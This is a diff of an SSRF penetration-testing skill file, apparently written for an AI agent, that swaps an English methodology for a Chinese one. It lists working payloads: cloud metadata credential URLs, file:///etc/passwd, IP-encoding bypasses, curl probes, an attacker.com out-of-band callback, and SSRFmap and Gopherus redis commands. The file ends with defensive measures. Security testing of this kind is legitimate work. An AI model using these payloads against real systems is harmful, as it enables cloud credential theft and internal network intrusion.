@@ -1,111 +1,101 @@
-# SSRF Testing Skill
+---
+name: ssrf-testing
+description: SSRF服务器端请求伪造测试的专业技能和方法论
+version: 1.0.0
+---
 
-## Overview
-Server-Side Request Forgery (SSRF) allows attackers to induce the server to make HTTP requests to arbitrary domains.
+# SSRF服务器端请求伪造测试
 
-## Testing Methodology
+## 概述
 
-### 1. Basic Payloads
-```html
-# Localhost
-http://127.0.0.1/
-http://localhost/admin
-http://[::1]/
+SSRF（Server-Side Request Forgery）是一种利用服务器发起请求的漏洞，可以访问内网资源、进行端口扫描或绕过防火墙。
 
-# Cloud metadata
-http://169.254.169.254/
-http://metadata.google.internal/
-http://169.254.169.254/latest/meta-data/
-http://metadata.google.internal/computeMetadata/v1/
+## 漏洞原理
 
-# File inclusion
+应用程序接受URL参数并请求该URL，攻击者可以控制请求的目标，导致：
+- 内网资源访问
+- 本地文件读取
+- 端口扫描
+- 绕过防火墙
+- 云服务元数据访问
+
+## 测试方法
+
+### 1. 识别SSRF输入点
+- URL预览/截图、文件上传（远程URL）、Webhook回调、API代理、数据导入、图片处理、PDF生成
+
+### 2. 基础检测
+**测试本地回环：**
+```
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+```
+
+**测试内网IP：**
+```
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+```
+
+**测试文件协议：**
+```
 file:///etc/passwd
-dict://localhost:11211/stats
-sftp://example.com:22/
+file:///C:/Windows/System32/drivers/etc/hosts
 ```
 
-### 2. Common Injection Points
+### 3. 绕过技术
+**IP地址编码：**
 ```
-?url=
-?uri=
-?next=
-?data=
-?q=
-?page=
-?feed=
-?dest=
-?redirect=
-?path=
-?continue=
-?url=
-?callback=
-?port=
-?host=
-?server=
+127.0.0.1 = 2130706433 (十进制)
+127.0.0.1 = 0x7f000001 (十六进制)
 ```
 
-### 3. Bypass Techniques
-```html
-# IP encoding
-127.0.0.1 = 2130706433 (decimal)
-127.0.0.1 = 0x7f000001 (hex)
-
-# URL encoding
-http://127.0.0.1 → http://127%E2%80%A60%E2%80%A60%E2%80%A61
-
-# Redirect
-http://evil.com@127.0.0.1
-http://127.0.0.1@evil.com
-
-# Alternate notation
-http://127.1/
-http://127.0.1/
+**域名解析绕过：**
+```
+127.0.0.1.xip.io
+127.0.0.1.nip.io
 ```
 
-### 4. Testing Commands
+## 利用技术
+
+### 云服务元数据
+**AWS EC2：**
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**Google Cloud：**
+```
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+**Azure：**
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+## 工具使用
+
+### SSRFmap
 ```bash
-# Basic test
-curl 'http://target.com/url?url=http://127.0.0.1'
-curl 'http://target.com/url?url=http://localhost/admin'
-
-# Cloud metadata test
-curl 'http://target.com/url?url=http://169.254.169.254/latest/meta-data/'
-curl 'http://target.com/url?url=http://metadata.google.internal/'
-
-# Internal port scan
-curl 'http://target.com/url?url=http://127.0.0.1:22/'
-curl 'http://target.com/url?url=http://127.0.0.1:3306/'
-
-# Protocol testing
-curl 'http://target.com/url?url=file:///etc/passwd'
-curl 'http://target.com/url?url=dict://localhost:11211/stats'
+python3 ssrfmap.py -r request.txt -p url
+python3 ssrfmap.py -r request.txt -p url -m portscan
+python3 ssrfmap.py -r request.txt -p url -m cloud
 ```
 
-### 5. Blind SSRF
+### Gopherus
 ```bash
-# Out-of-band detection
-# Attacker-controlled server
-nc -lvnp 8080
-
-# Payload
-curl 'http://target.com/url?url=http://attacker.com:8080/'
+python gopherus.py --exploit redis
 ```
 
-### 6. Tools
-```bash
-# nuclei templates
-nuclei -u https://target.com -t ssrf.yaml
+## 防护措施
 
-# ffuf for parameter fuzzing
-ffuf -w params.txt -u https://target.com/?url=FUZZ -v
-```
-
-## Testing Checklist
-- [ ] Identify URL/endpoint parameters
-- [ ] Test localhost access
-- [ ] Test cloud metadata endpoints
-- [ ] Test internal port scanning
-- [ ] Test file:// protocol
-- [ ] Test bypass techniques
-- [ ] Test blind SSRF with OOB
-- [ ] Document findings
+1. **URL白名单** - 只允许特定域名
+2. **禁用危险协议** - 只允许http/https，禁止file://、gopher://等
+3. **IP地址过滤** - 检查是否为内网IP
+4. **DNS解析验证** - 解析后验证IP是否内网
+5. **网络隔离** - 限制服务器出网权限
